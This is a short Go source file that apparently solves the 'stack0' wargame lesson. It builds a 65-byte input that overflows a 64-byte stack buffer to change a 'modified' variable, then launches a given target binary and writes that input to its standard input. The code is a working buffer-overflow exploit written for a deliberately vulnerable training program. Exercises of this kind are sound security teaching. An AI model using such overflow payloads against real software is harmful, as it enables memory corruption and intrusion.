package main

import (
	"fmt"
	"os"
	"os/exec"
)

type stack0 struct {
}

func (s stack0) get_lesson_name() string {
	return "stack0"
}

func (s stack0) get_password() []byte {
	/*
		0 - 64: "Try again"
		65 - 79: "You have changed the 'modified' variable"
		80 - ...: ""
	*/
	initialBuffer := make([]byte, 64)
	fill_byte_array(initialBuffer, '\xFF')

	modifiedData := make([]byte, 1)
	modifiedData[0] = '\xFF'

	password := append(initialBuffer[:], modifiedData[:]...)
	return password
}

func (s stack0) start_lesson(target_binary string) {
	fmt.Println("Trying to exploit: " + target_binary)
	cmdTarget := exec.Command(target_binary)
	cmdTarget.Stdout = os.Stdout
	stdin, _ := cmdTarget.StdinPipe()
	defer stdin.Close()

	_ = cmdTarget.Start()
	stdin.Write(s.get_password())
}
